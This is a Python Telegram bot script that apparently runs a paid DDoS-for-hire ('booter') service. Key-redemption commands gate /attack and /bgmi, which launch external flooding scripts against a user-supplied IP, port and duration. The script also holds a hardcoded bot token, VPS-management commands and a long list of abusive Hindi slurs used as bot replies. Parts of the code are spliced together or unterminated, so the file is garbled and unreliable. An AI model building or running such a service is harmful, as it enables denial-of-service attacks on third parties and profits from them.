#!/usr/bin/python3
import telebot
import time
import datetime
import subprocess
import threading
import random
import string
import pytz
import json
import os
import psutil
import platform
import logging
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton  # ✅ FIXED IMPORT ERROR

# ✅ TELEGRAM BOT TOKEN
bot = telebot.TeleBot('7733619497:AAFwoK9dwZpGIjzrwGu5Yh_ojC3FrWqgYvQ')

# ✅ GROUP AND ADMIN DETAILS
GROUP_ID = "-1002252633433"
ADMINS = ["7129010361"]
SCREENSHOT_CHANNEL = "@KHAPITAR_BALAK77"


import random

random_replies = [
    # 🔥 Normal मज़ेदार Replies  
    "🤖 Kya haal hai?",
    "🔥 Koi command use karo!",
    "🚀 Main sirf commands ke liye bana hoon!",
    "😂 Padhai likhai karo, bot se mat baat karo!",
    "😜 Aap kya soch rahe hain?",
    "🎯 Koi help chahiye toh /help likho!",
    "😎 Itni raat ko online kyun ho?",
    "🎮 Koi BGMI khel raha hai kya?",
    "📢 Group main spam mat karo warna block ho jaoge!",
    "🤖 Main AI hoon, insaan nahi!",
    "🎵 Ek gaana sunao bhai!",
    "👽 Tera dimaag alien se connect ho gaya kya?",
    "😆 Haste raho, masti karte raho!",
    "🕵️ Pura CBI investigation kar raha hai kya?",
    "🚦 Signal pe ruk jao, green hone do!",
    "👀 Tera pichla janam me bhi bot se baat karta tha kya?",
    "🚁 Tera dimaag upar se ud gaya kya?",
    "⚡ Light aa gayi, ab tension mat le!",
    "🤩 Tujhe dekh ke mujhe hasi aa rahi hai!",
    "🚀 Elon Musk tera dost hai kya?",
    "🎩 Tera style OP hai!",
    "🍔 Bhookh lagi hai, kuch khilwa de!",
    "💻 Hacking seekhni hai kya?",
    "⚡ High voltage baatein chal rahi hain!",
    "🚀 SpaceX se call aaya tha, tu rocket ke liye select ho gaya!",
    
    # 🤣 मज़ेदार Jokes & Troll Replies  
    "😂 Tujhe bhi bot se baat karni thi kya?",
    "💀 RIP teri akal!",
    "🤣 Bhai tu full comedy hai!",
    "🥶 Itna thanda reply kyu diya?",
    "😜 Mujhse jokes sunoge?",
    "💀 Jyada dimaag mat lagao, warna format ho jaoge!",
    "👀 Mujhse mat pucho, admin se baat karo!",
    "🔥 Aag laga di bhai ne!",
    "💡 Koi new idea hai toh batao!",
    "🎲 Ek game kheloge?",
    "💀 Error 404: Tera dimaag not found!",
    "👻 Bhai tu toh bhoot lag raha hai!",
    "🤡 Mujhe lagta hai tu mujhe test kar raha hai!",
    "🧠 Dimaag ka GPS on kar, tu bhatak raha hai!",
    "🔥 Koi VIP key buy karni hai kya?",
    "📢 Kya aap mujhe follow karte hain?",
    "🦉 Raat ke 2 baje bhi online kya kar raha hai?",
    "🎭 Ye asli hai ya duplicate?",
    "🚀 Tera bhai bot hai!",
    "⚡ Teri soch Windows XP se bhi slow hai!",
    "💀 Tera IQ toh 2G network se bhi slow hai!",
    "🎯 Tujhse smart toh meri battery percentage hai!",
    "🚔 Cyber police aa rahi hai!",
    "💎 VIP ho ya noob?",
    "🔮 Future bataun kya?",
    "🛸 Tujhe aliens se signal mil raha hai kya?",
    
    # 🤬 हल्की-फुल्की गालियां (मस्ती वाली)  
    "🤡 Bsdk, kya chahiye tujhe?",
    "💀 Bhai, dimaag mat khaa warna format kar dunga!",
    "😂 Tere jaisa chomu maine pehli baar dekha hai!",
    "👀 Tera dimaag shakal se bhi zyada bekar lagta hai!",
    "🔥 Bhai, tere dimaag ka software corrupt ho gaya hai!",
    "🤣 Jyada shana mat ban, warna system hang ho jayega!",
    "💩 Aye ullu ke pathe, kaam ki baat kar!",
    "🚀 Teri soch se tez to mera internet hai!",
    "🥶 Itni thand me bhi teri bakwaas garam hai!",
    "🤖 Bhai, tu sach me ek alag prani hai!",
    "💀 Tera logic 1947 me hi chhut gaya kya?",
    "👻 Bhootni ke, dimaag lagane ka try kar!",
    "🤣 Itni fuzool baatein, tu politician banna chahta hai kya?",
    "💩 Tere se zyada to meri RAM fast chalti hai!",
    "🔥 Teri shakal dekhke lagta hai tune aaj bhi nahaaya nahi hai!",
    "👀 Tere liye Google search engine bhi fail ho gaya hai!",
    "🤬 Abe chutiyapa mat phela idhar!",
    "👊 Aisa thappad padega ki Windows 10 se Windows XP ban jayega!",
    "🧠 Tera dimaag HDD pe install hai kya?",
    "📢 Bhai, tere jaise namuno ka museum bana chahiye!",
    "🛑 Bakchodi band kar, warna system restart ho jayega!",
    "🔥 Tujhe dekhke lagta hai tujhe 2GB RAM bhi zyada hai!",
    "🧨 Bakchodi limit se zyada ho gayi hai, shutdown ho raha hai!",
    "👀 Tujhse better to mere phone ki auto-correct hai!",
    "💣 Tera dimaag Hiroshima ka bomb lag raha hai!",
    "🤣 Bhai, tu pagal hai kya?",
    "💀 Dimaag lagane ka try mat kar, overload ho jayega!",
    "🚀 Aise bakchodi mat kar warna Elon Musk tera Twitter suspend kar dega!",
    "🧠 Tujhe dimaag donate karne ka plan hai kya?",
    "⚡ Jyada shana mat ban, warna fuse ud jayega!",
    "🤡 Bsdk, kya chahiye tujhe?",
    "💀 Bhai, dimaag mat khaa warna format kar dunga!",
    "😂 Tere jaisa chomu maine pehli baar dekha hai!",
    "👀 Tera dimaag shakal se bhi zyada bekar lagta hai!",
    "🔥 Bhai, tere dimaag ka software corrupt ho gaya hai!",
    "🤣 Jyada shana mat ban, warna system hang ho jayega!",
    "💩 Aye ullu ke pathe, kaam ki baat kar!",
    "🚀 Teri soch se tez to mera internet hai!",
    "🥶 Itni thand me bhi teri bakwaas garam hai!",
    "🤖 Bhai, tu sach me ek alag prani hai!",
    "💀 Tera logic 1947 me hi chhut gaya kya?",
    "👻 Bhootni ke, dimaag lagane ka try kar!",
    "🤣 Itni fuzool baatein, tu politician banna chahta hai kya?",
    "💩 Tere se zyada to meri RAM fast chalti hai!",
    "🔥 Teri shakal dekhke lagta hai tune aaj bhi nahaaya nahi hai!",
    "👀 Tere liye Google search engine bhi fail ho gaya hai!",
    "🤬 Abe chutiyapa mat phela idhar!",
    "👊 Aisa thappad padega ki Windows 10 se Windows XP ban jayega!",
    "🧠 Tera dimaag HDD pe install hai kya?",
    "📢 Bhai, tere jaise namuno ka museum bana chahiye!",
    "🛑 Bakchodi band kar, warna system restart ho jayega!",
    "🔥 Tujhe dekhke lagta hai tujhe 2GB RAM bhi zyada hai!",
    "🧨 Bakchodi limit se zyada ho gayi hai, shutdown ho raha hai!",
    "👀 Tujhse better to mere phone ki auto-correct hai!",
    "💣 Tera dimaag Hiroshima ka bomb lag raha hai!",
    "🤣 Bhai, tu pagal hai kya?",
    "💀 Dimaag lagane ka try mat kar, overload ho jayega!",
    "🚀 Aise bakchodi mat kar warna Elon Musk tera Twitter suspend kar dega!",
    "🧠 Tujhe dimaag donate karne ka plan hai kya?",
    "⚡ Jyada shana mat ban, warna fuse ud jayega!",
    "😂 Teri baatein sunke to meri battery bhi drain ho gayi!",
    "😆 Itna chutiya kaun hota hai bhai?",
    "🛑 Bhai, stop kar warna virus upload kar dunga!",
    "🤡 Tere jaise joker ko to circus me hona chahiye!",
    "🗿 Teri soch Ajanta Ellora ki caves jitni purani hai!",
    "🔥 Tu logic se door, bakchodi me expert hai!",
    "💀 Tujhe dekh ke to AI bhi error de rahi hai!",
    "😂 Teri akal 1kbps ke speed pe chal rahi hai!",
    "💣 Tere dimaag me 404 error hai, update kar!",
    "🛑 Tere jaise logon ki wajah se internet slow ho gaya hai!",
    "🚀 Tu space mission pe jaane ke layak hai, bas wapas mat aana!",
    "🤡 Itni overacting mat kar, Filmfare nahi milega!",
    "💀 Bhai, tera dimaag Bootloader mode pe atka hai!",
    "🧠 Tujhse zyada to Google Assistant smart hai!",
    "🔥 Aisa lag raha hai, tujhe Windows 95 pe install kiya gaya hai!",
    "👊 Itni bakchodi karega to system crash ho jayega!",
    "💩 Bhai, tu life ka ek corrupted file hai!",
    "💀 Tujhe Microsoft ban pe daal dega itni errors aayi hai tujhme!",
    "🔥 Tu dimaag se slow aur bakchodi me fast hai!",
    "🛑 Tujhe cyber police ke hawale kar dun kya?",
    "🤡 Bhai, tu comedy circus ka missing contestant hai!",
    "💣 Teri soch hi ek malware hai, system clean kar!",
    "😆 Bhai, tera दिमाग़ Windows XP mode pe chal raha hai!",
    "💀 Tujhse baat karna bhi ek achievement hai!",
    "🔥 Aise bakchodi mat kar warna log trolled feel karenge!",
    "🤡 Abe ullu ke patthe, dimaag ka GPS on kar!",
    "💀 Tera dimaag toh 2G network pe chal raha hai!",
    "😂 Aree lawde, apni aukaat me reh!",
    "🔥 Bhai, tu chutiya hai certified!",
    "🤣 Tere jaisa namuna maine pehli baar dekha hai!",
    "💩 Bhains ki aankh, tu kya bakwas kar raha hai!",
    "🚀 Bsdk, tera logic Windows 95 se bhi slow hai!",
    "🥶 Lawde, thand lag rahi hai kya?",
    "🤖 Madarchod, tu bot se pange lega?",
    "⚡ Teri soch se tez to mera internet hai!",
    "💀 Bc, dimaag kharab mat kar warna motherboard uda dunga!",
    "👊 Aree chodu, chup baith!",
    "💩 Oye bhadwe, tu kiske baap ka nokar hai?",
    "🛑 Bhai, tere jaise chutiye history me likhe jaane chahiye!",
    "🔥 Tujhse zyada toh meri battery percentage fast chalti hai!",
    "🤣 Teri baat sunke to meri RAM bhi crash ho gayi!",
    "💀 Abe chirkut, akal ke dushman!",
    "😂 Chutiya detected! System shutting down!",
    "🚀 Tera dimaag Google Maps pe bhi track nahi ho sakta!",
    "💣 Madarchod, aise spam karega to format ho jayega!",
    "🤬 Bc, tera dimaag to Windows XP mode pe atka hai!",
    "🧠 Bsdk, tujhme thodi bhi akal hai?",
    "🔥 Bc, apni aukaat me reh warna block ho jayega!",
    "💀 Bhai, tera dimaag kharab hai ya default factory setting pe hai?",
    "😂 Oye gadhe, tu sochta kyu nahi?",
    "🚀 Chutiyapa limit cross kar diya, tu NASA se alien lagta hai!",
    "💣 Bsdk, tu na ek corrupt file hai, delete hone layak!",
    "⚡ Bc, tu na ek walking error hai!",
    "🧨 Bhai, tu bakchodi ki dukaan hai!",
    "💀 Tera logic dead ho gaya kya?",
    "🤡 Tere liye Google bhi error de raha hai!",
    "🔥 Oye behenchod, system reboot kar warna short circuit ho jayega!",
    "🤣 Bc, tu na kisi kaam ka nahi!",
    "🚀 Lawde, teri soch Wikipedia me bhi nahi milti!",
    "👊 Bhai, tu ek noob hai!",
    "💩 Chup baith madarchod!",
    "💀 Teri akal to XP mode pe hai!",
    "🤬 Oye bhadwe, dimag lagane ka try kar!",
    "😂 Madarchod, tu bas bakchodi me gold medal le sakta hai!",
    "🛑 Bhai, tu full chutiyapa hai!",
    "🔥 Bc, tu problem nahi, ek puri technical error hai!",
    "💣 Abe lawde, tera CPU heat ho gaya hai!",
    "⚡ Bhai, tujhe reboot karne ki zaroorat hai!",
    "😂 Teri soch dekh ke Microsoft ne Windows ban kar diya!",
    "🤡 Bsdk, tu bug hai, fix hone layak!",
    "💀 Madarchod, ek baar aur spam kiya to delete ho jayega!",
    "🚀 Behen ke lode, chill maar warna crash ho jayega!",
    "🧠 Tujhse zyada to mera phone ka calculator smart hai!",
    "💣 Abe bhosdike, dimag chalane ka try kar!",
    "🔥 Tere jaisa bekaar insan sirf YouTube ke comment section me milta hai!",
    "🤣 Bhai, tu full chutiya lag raha hai!",
    "🚀 Bc, tu ghar ja warna cyber police pakad legi!",
    "👊 Oye randichod, shanti se baith!",
    "💩 Chup saale, warna format kar dunga!",
    "💀 Tujhse smart to mere ghar ka WiFi router hai!",
    "🤡 Bsdk, tu asli namuna hai!",
    "🔥 Aree chodu, tu pagal hai kya?",
    "🤣 Behen ke takke, chill kar warna fuse udd jayega!"
]

# ✅ CALLBACK HANDLER FOR HELP BUTTON
@bot.callback_query_handlerx Time (Editable via /maxtime)
MAX_TIME_ATTACK = 100  # Default Max Time for /attack
MAX_TIME_BGMI = 240  # Default Max Time for /bgmi

# ✅ FILE PATHS
USER_FILE = "users.txt"
KEY_FILE = "keys.txt"
REDEEM_LOG_FILE = "redeem_log.json"

# ✅ Timezone सेट (IST)
IST = pytz.timezone('Asia/Kolkata')

# ✅ Redeem Log लोड/सेव फंक्शन
def load_redeem_log():
    try:
        with open(REDEEM_LOG_FILE, "r") as file:
            return json.load(file)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_redeem_log(log):
    with open(REDEEM_LOG_FILE, "w") as file:
        json.dump(log, file)

redeem_log = load_redeem_log()

# ✅ Key और User डेटा लोड करने के फंक्शन
def read_keys():
    keys = {}
    try:
        with open(KEY_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                parts = line.split()
                if len(parts) >= 2:
                    key = parts[0]
                    expiry_str = " ".join(parts[1:])
                    try:
                        expiry = datetime.datetime.strptime(expiry_str, '%Y-%m-%d %H:%M:%S')
                        expiry = IST.localize(expiry)
                        keys[key] = expiry
                    except ValueError:
                        print(f"⚠ Error parsing date for key {key}: {expiry_str}")
    except FileNotFoundError:
        pass
    return keys

def write_keys(keys):
    with open(KEY_FILE, "w") as file:
        for key, expiry in keys.items():
            file.write(f"{key} {expiry.strftime('%Y-%m-%d %H:%M:%S')}\n")

def read_users():
    users = set()
    try:
        with open(USER_FILE, "r") as file:
            users = set(file.read().splitlines())
    except FileNotFoundError:
        pass
    return users

allowed_users = read_users()
keys = read_keys()

# ✅ Expired Users को Remove करने का फंक्शन
def remove_expired_users():
    now = datetime.datetime.now(IST)
    expired_users = []

    for user_id, key in redeem_log.items():
        if key in keys and now > keys[key]:
            expired_users.append(user_id)

    for user_id in expired_users:
        if user_id in allowed_users:
            allowed_users.remove(user_id)
        del redeem_log[user_id]

    for key in list(keys.keys()):
        if now > keys[key]:
            del keys[key]

    save_redeem_log(redeem_log)
    write_keys(keys)

    with open(USER_FILE, "w") as file:
        file.writelines("\n".join(allowed_users))

# ✅ बॉट स्टार्ट होने पर Expired Users Remove करें
remove_expired_users()

# ✅ Key Generate, Validate, Remove
def generate_key(days=0, hours=0):
    new_key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    expiry = datetime.datetime.now(IST) + datetime.timedelta(days=days, hours=hours)  # ✅ Fix: expiry अब सही से बन रहा है
    keys[new_key] = expiry
    write_keys(keys)
    return new_key

def remove_key(key):
    if key in keys:
        del keys[key]
        write_keys(keys)

        # ✅ अब उस Key को यूज़ करने वाले यूज़र को भी हटाओ
        user_to_remove = None
        for user_id, user_key in redeem_log.items():
            if user_key == key:
                user_to_remove = user_id
                break

        if user_to_remove:
            redeem_log.pop(user_to_remove, None)  # ✅ User को redeem_log से हटाओ
            allowed_users.discard(user_to_remove)  # ✅ User को allowed_users से हटाओ

            # ✅ Users file अपडेट करो
            with open(USER_FILE, "w") as file:
                file.writelines("\n".join(allowed_users))

            save_redeem_log(redeem_log)  # ✅ Updated Log Save करो

        return True
    return False

def is_user_allowed(user_id):
    now = datetime.datetime.now(IST)
    if user_id in redeem_log:
        key = redeem_log[user_id]
        if key in keys and now > keys[key]:
            # ✅ अगर Key expire हो गई, तो यूजर को remove कर दो
            del keys[key]  # Expired Key हटाओ
            del redeem_log[user_id]  # Redeem Log से यूजर हटाओ
            allowed_users.discard(user_id)  # Allowed Users से हटाओ
            save_redeem_log(redeem_log)
            write_keys(keys)

            # ✅ Users file अपडेट करो
            with open(USER_FILE, "w") as file:
                file.writelines("\n".join(allowed_users))
            return False  # ❌ अब यह यूजर blocked हो गया
    return user_id in allowed_users

# ✅ /START Command (Welcome + Help Button)
@bot.message_handler(commands=['start'])
def start_command(message):
    user = message.from_user
    first_name = user.first_name if user.first_name else "User"

    # ✅ Inline Button for Help
    markup = InlineKeyboardMarkup()
    help_button = InlineKeyboardButton("ℹ HELP", callback_data="show_help")
    markup.add(help_button)

    welcome_text = f"👋 **WELCOME, {first_name}!**\nमैं तुम्हारी हेल्प के लिए यहाँ हूँ। नीचे दिए गए बटन पर क्लिक करो:"

    bot.send_message(message.chat.id, welcome_text, reply_markup=markup, parse_mode="Markdown")

# help
@bot.callback_query_handler(func=lambda call: call.data == "show_help")
def help_callback(call):
    help_text = """
📌 **BOT COMMANDS LIST:**  

👤 **USER COMMANDS:**
🔹 /myinfo - Apna status aur key expiry check karo
🔹 /redeem <KEY> - Access ke liye key redeem karo
🔹 /attack <IP> <PORT> <TIME> - Normal attack start karo
🔹 /bgmi <IP> <PORT> <TIME> - VIP attack (zyada time) start karo
🔹 /uptime - Bot ka uptime check karo

👑 **ADMIN COMMANDS:**
🔹 /genkey <DAYS> [HOURS] - Nayi key banao
🔹 /multiuserkey <DAYS> [HOURS] - Multi-user key generate karo
🔹 /removekey <KEY> - Kisi key ko delete karo
🔹 /maxtime <attack/bgmi> <TIME> - Max time limit set karo
🔹 /stats - Active attacks dekhne ke liye
🔹 /check - Active keys list check karo
🔹 /redeemed - Sabhi redeemed users list dekho
🔹 /announce <message> - Group me announcement bhejo
🔹 /logs - Last 20 bot logs dekho
🔹 /serverstatus - Server ka CPU aur RAM usage dekho

💻 **VPS MANAGEMENT:**
🔹 /addvps <IP> <USERNAME> <PASSWORD> - Naya VPS add karo
🔹 /removevps <IP> - VPS remove karo
🔹 /checkvps - Active VPS list check karo

📷 **MEDIA & SCREENSHOT SYSTEM:**
🔹 Screenshot bhejo aur wo admins ko forward ho jayega ✅

💬 **FUN & RANDOM REPLIES:**  
🔹 Koi bhi non-command message likho, aur bot random reply dega! 🎭😂

    bot.send_message(call.message.chat.id, help_text, parse_mode="Markdown")
# ✅ /GENKEY Command (Admin Only)
# ✅ /GENKEY Command (Admin Only) - Now Generates Keys in "1H-RSVIP-XXXXXX" Format
@bot.message_handler(commands=['genkey'])
def generate_new_key(message):
    if str(message.from_user.id) not in ADMINS:
        bot.reply_to(message, "❌ ADMIN ONLY COMMAND!")
        return  # **✅ फिक्स: अगर एडमिन नहीं है तो रिटर्न करो**

    command = message.text.split()

    if len(command) < 2:
        bot.reply_to(message, "⚠ USAGE: /genkey <DAYS> [HOURS]")
        return  # **✅ फिक्स: अगर कमांड सही फॉर्मेट में नहीं है तो रिटर्न करो**

    try:
        days = int(command[1])
        hours = int(command[2]) if len(command) > 2 else 0  # ✅ अब घंटे भी ऐड हो सकते हैं
    except ValueError:
        bot.reply_to(message, "❌ DAYS AND HOURS MUST BE NUMBERS!")
        return

    # ✅ अब की का फॉर्मेट सही बनाते हैं
    if days > 0 and hours == 0:
        prefix = f"{days}D-RSVIP"
    elif hours > 0 and days == 0:
        prefix = f"{hours}H-RSVIP"
    else:
        prefix = f"{days}D{hours}H-RSVIP"

    random_part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))  # ✅ 6 Random Characters
    new_key = f"{prefix}-{random_part}"

    expiry = datetime.datetime.now(IST) + datetime.timedelta(days=days, hours=hours)
    keys[new_key] = expiry
    write_keys(keys)

    bot.reply_to(message, f"✅ NEW KEY GENERATED:\n?? `{new_key}`\n📅 Expiry: {days} Days, {hours} Hours", parse_mode="Markdown")

@bot.message_handler(func=lambda message: True)
def random_reply(message):
    if message.text.startswith("/"):  # ✅ अगर Command है, तो Ignore करो
        return

    reply = random.choice(random_replies)  # ✅ रैंडम रिप्लाई चुनो
    bot.reply_to(message, reply)

# removekey 
@bot.message_handler(commands=['removekey'])
def remove_existing_key(message):
    if str(message.from_user.id) not in ADMINS:
         bot.reply_to(message, "❌ ADMIN ONLY COMMAND!")

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "⚠ USAGE: /removekey <KEY>")
        return 

    if remove_key(command[1]):
        bot.reply_to(message, "✅ KEY REMOVED SUCCESSFULLY!")
    else:
        bot.reply_to(message, "❌ KEY NOT FOUND!")

# ✅ FIXED: SCREENSHOT SYSTEM (Now Always Forwards)
@bot.message_handler(content_types=['photo'])
def handle_screenshot(message):
    user_id = str(message.from_user.id)

    # ✅ यूजर का स्क्रीनशॉट सेव करें  
    file_id = message.photo[-1].file_id  
    user_screenshots[user_id] = file_id  

    caption_text = f"📸 **USER SCREENSHOT RECEIVED!**\n👤 **User ID:** `{user_id}`\n✅ **FORWARDED BY FREE USER!**"
    bot.send_photo(SCREENSHOT_CHANNEL, file_id, caption=caption_text, parse_mode="Markdown")

    bot.reply_to(message, "✅ **SCREENSHOT RECEIVED! अब आप अटैक कर सकते हैं।**")

# ✅ /MULTIUSERKEY Command (Admin Only)
@bot.message_handler(commands=['multiuserkey'])
def generate_multiuser_key(message):
    if str(message.from_user.id) not in ADMINS:
        bot.reply_to(message, "❌ ADMIN ONLY COMMAND!")
        return

    command = message.text.split()
    if len(command) < 2:
        bot.reply_to(message, "⚠ USAGE: /multiuserkey <DAYS> [HOURS]")
        return

    try:
        days = int(command[1])
        hours = int(command[2]) if len(command) > 2 else 0
    except ValueError:
        bot.reply_to(message, "❌ DAYS AND HOURS MUST BE NUMBERS!")
        return

    expiry = datetime.datetime.now(IST) + datetime.timedelta(days=days, hours=hours)

    # ✅ MULTI-USER KEY GENERATION
    new_key = f"MULTI-{''.join(random.choices(string.ascii_uppercase + string.digits, k=6))}"
    keys[new_key] = expiry
    write_keys(keys)

    bot.reply_to(message, f"✅ MULTI-USER KEY GENERATED:\n🔑 `{new_key}`\n📅 Expiry: {days} Days, {hours} Hours", parse_mode="Markdown")

# ✅ Updated /REDEEM Command for Multi-User Key Support
@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "⚠ USAGE: /redeem <KEY>")
        return

    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name  
    key = command[1]

    # ✅ INVALID KEY CHECK
    if key not in keys:
        bot.reply_to(message, "❌ INVALID KEY! 🔑")  
        return

    expiry_date = keys[key]
    if datetime.datetime.now(IST) > expiry_date:
        del keys[key]
        write_keys(keys)
        bot.reply_to(message, f"⏳ THIS KEY HAS **EXPIRED!**\n📅 **Expired On:** `{expiry_date.strftime('%Y-%m-%d %H:%M:%S IST')}`", parse_mode="Markdown")
        return

    # ✅ MULTI-USER KEY LOGIC
    if key.startswith("MULTI-"):
        allowed_users.add(user_id)
        redeem_log[user_id] = key
        save_redeem_log(redeem_log)

        with open(USER_FILE, "a") as file:
            file.write(f"{user_id}\n")

        bot.reply_to(message, f"🎉 ACCESS GRANTED!\n👤 **User:** `{user_name}`\n🆔 **User ID:** `{user_id}`\n🔑 **Key:** `{key}`\n📅 **Expires On:** `{expiry_date.strftime('%Y-%m-%d %H:%M:%S IST')}`", parse_mode="Markdown")
        return

    # ✅ NORMAL KEY LOGIC (SINGLE-USE)
    if user_id in redeem_log:
        bot.reply_to(message, f"❌ YOU HAVE ALREADY REDEEMED A KEY!\n🔑 **Your Key:** `{redeem_log[user_id]}`", parse_mode="Markdown")
        return

    if key in redeem_log.values():
        existing_user = [uid for uid, k in redeem_log.items() if k == key][0]
        bot.reply_to(message, f"❌ THIS KEY HAS ALREADY BEEN REDEEMED!\n👤 **User ID:** `{existing_user}`", parse_mode="Markdown")
        return

    allowed_users.add(user_id)
    redeem_log[user_id] = key
    save_redeem_log(redeem_log)

    with open(USER_FILE, "a") as file:
        file.write(f"{user_id}\n")

    bot.reply_to(message, f"🎉 ACCESS GRANTED!\n👤 **User:** `{user_name}`\n🆔 **User ID:** `{user_id}`\n🔑 **Key:** `{key}`\n📅 **Expires On:** `{expiry_date.strftime('%Y-%m-%d %H:%M:%S IST')}`", parse_mode="Markdown")

# ✅ /attack Command (Attack Start + Finish Message)  
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = str(message.from_user.id)

    # ✅ ENSURE THE COMMAND RUNS ONLY IN BOT'S PRIVATE CHAT  
    if message.chat.type != "private":
        bot.reply_to(message, "🚫 **THIS COMMAND ONLY WORKS IN BOT'S PRIVATE CHAT!** ❌")
        return  

    # ✅ CHECK IF THE USER HAS SENT A SCREENSHOT BEFORE ALLOWING THE ATTACK  
    if user_id not in user_screenshots:
        bot.reply_to(message, "⚠ **SEND A SCREENSHOT FIRST, THEN YOU CAN START AN ATTACK!**")
        return  

    # ✅ PROCEED WITH THE ATTACK IF THE SCREENSHOT IS RECEIVED  
    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "⚠ **USAGE:** /ATTACK <IP> <PORT> <TIME>")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "❌ **PORT AND TIME MUST BE NUMBERS!**")
        return

    if time_duration > MAX_TIME_ATTACK:
        bot.reply_to(message, f"🚫 **FREE USER ATTACK TIME LIMIT IS {MAX_TIME_ATTACK} SECONDS!**")
        return

    # ✅ START THE ATTACK  
    try:
        subprocess.Popen(["python3", "free.py", target, str(port), str(time_duration)])
        bot.reply_to(message, f"🚀 **ATTACK STARTED! /STATS**\n🎯 **TARGET:** `{target}`\n🔢 **PORT:** `{port}`\n⏳ **DURATION:** `{time_duration} SECONDS`", parse_mode="Markdown")

        # ✅ SEND ATTACK COMPLETION MESSAGE AFTER THE SPECIFIED TIME  
        def send_attack_finished():
            time.sleep(time_duration)
            bot.send_message(message.chat.id, f"✅ **ATTACK FINISHED!**\n🎯 **TARGET:** `{target}`\n🔢 **PORT:** `{port}`", parse_mode="Markdown")

        threading.Thread(target=send_attack_finished, daemon=True).start()

    except Exception as e:
        bot.reply_to(message, f"❌ **ERROR STARTING THE ATTACK!**\n🛠 **ERROR:** `{str(e)}`", parse_mode="Markdown")

#  ✅ `/vipattack` (Max 300 sec, Only for VIP Users)  
@bot.message_handler(commands=['bgmi'])
def handle_vip_attack(message):
    user_id = str(message.from_user.id)

    # ✅ सिर्फ ग्रुप में काम करेगा  
    if str(message.chat.id) != GROUP_ID:
        bot.reply_to(message, "🚫 **YE BOT SIRF GROUP ME CHALEGA!** ❌")
        return

    # ✅ पहले चेक करें कि यूज़र ने Key रिडीम की है और VIP है या नहीं  
    if not is_user_allowed(user_id):
        bot.reply_to(message, "❌ **PEHLE VIP KEY REDEEM KARO, TABHI ATTACK KAR SAKTE HO!**")
        return

    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "⚠ **USAGE:** /bgmi <IP> <PORT> <TIME>")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "❌ **PORT AUR TIME SIRF NUMBERS ME HONA CHAHIYE!**")
        return

    if time_duration > MAX_TIME_BGMI:
    bot.reply_to(message, f"🚫 **VIP USERS KE LIYE MAX ATTACK TIME {MAX_TIME_BGMI} SECONDS HAI!**")
    return

    # ✅ Multivps.py को सही से रन करें  
    try:
        subprocess.Popen(["python3", "vip.py", target, str(port), str(time_duration)])
        bot.reply_to(message, f"🔥 **VIP Attack Started! /stats **\n🎯 **Target:** `{target}`\n🔢 **Port:** `{port}`\n⏳ **Duration:** `{time_duration}s`", parse_mode="Markdown")

        attack_end_time = time.time() + time_duration
        if user_id not in active_attacks:
            active_attacks[user_id] = []
        active_attacks[user_id].append((target, port, attack_end_time))

        def send_attack_finished():
            time.sleep(time_duration)
            bot.send_message(message.chat.id, f"✅ **VIP Attack Finished!**\n🎯 **Target:** `{target}`\n🔢 **Port:** `{port}`", parse_mode="Markdown")

        threading.Thread(target=send_attack_finished, daemon=True).start()

    except Exception as e:
        bot.reply_to(message, f"❌ **VIP Attack Start Karne Me Error Aaya!**\n🛠 **Error:** `{str(e)}`", parse_mode="Markdown")

LOG_FILE = "bot_logs.txt"

def log_message(text):
    with open(LOG_FILE, "a") as file:
        file.write(f"{text}\n")

@bot.message_handler(commands=['logs'])
def get_logs(message):
    if str(message.from_user.id) not in ADMINS:
        bot.reply_to(message, "❌ ADMIN ONLY COMMAND!")
        return

    try:
        with open(LOG_FILE, "r") as file:
            logs = file.readlines()[-20:]  # ✅ आखिरी 20 Lines भेजो
    except FileNotFoundError:
        bot.reply_to(message, "❌ No Logs Found!")
        return

    bot.reply_to(message, "📜 **Last 20 Logs:**\n" + "".join(logs), parse_mode="Markdown")

# ✅ `/stats` Command  
@bot.message_handler(commands=['stats'])
def attack_stats(message):
    now = time.time()
    updated_attacks = {}

    # ✅ खत्म हो चुके अटैक्स हटाएँ  
    for user_id, attacks in active_attacks.items():
        active_attacks[user_id] = [attack for attack in attacks if attack[2] > now]
        if active_attacks[user_id]:  
            updated_attacks[user_id] = active_attacks[user_id]

    # ✅ अगर कोई एक्टिव अटैक नहीं बचा तो मैसेज भेजें  
    if not updated_attacks:
        bot.reply_to(message, "📊 **No Active Attacks Right Now!**")
        return

    # ✅ एक्टिव अटैक्स का Status तैयार करें  
    stats_message = "📊 **ACTIVE ATTACKS:**\n\n"
    for user_id, attacks in updated_attacks.items():
        stats_message += f"👤 **User ID:** `{user_id}`\n"
        for target, port, end_time in attacks:
            remaining_time = int(end_time - now)
            stats_message += f"🎯 **Target:** `{target}`\n🔢 **Port:** `{port}`\n⏳ **Ends In:** `{remaining_time}s`\n\n"

    bot.reply_to(message, stats_message, parse_mode="Markdown")

# ✅ /MYINFO Command (Shows User Details + Key Expiry)
@bot.message_handler(commands=['myinfo'])
def my_info(message):
    user = message.from_user
    user_id = str(user.id)
    username = user.username if user.username else "N/A"
    first_name = user.first_name if user.first_name else "N/A"
    last_name = user.last_name if user.last_name else "N/A"

    # ✅ अगर यूजर की Key एक्सपायर हो चुकी है
    if not is_user_allowed(user_id):
        bot.reply_to(message, "⏳ **PEHLE KEY BUY KR! PLEASE REDEEM A KEY.**")
        return  # ✅ FIX: यहाँ से फंक्शन को रोक देना चाहिए

    is_admin = "✅ YES" if user_id in ADMINS else "❌ NO"
    has_access = "✅ YES" if user_id in allowed_users else "❌ NO"

    # ✅ Key Details Check
    if user_id in redeem_log:
        user_key = redeem_log[user_id]
        expiry_date = keys.get(user_key, None)
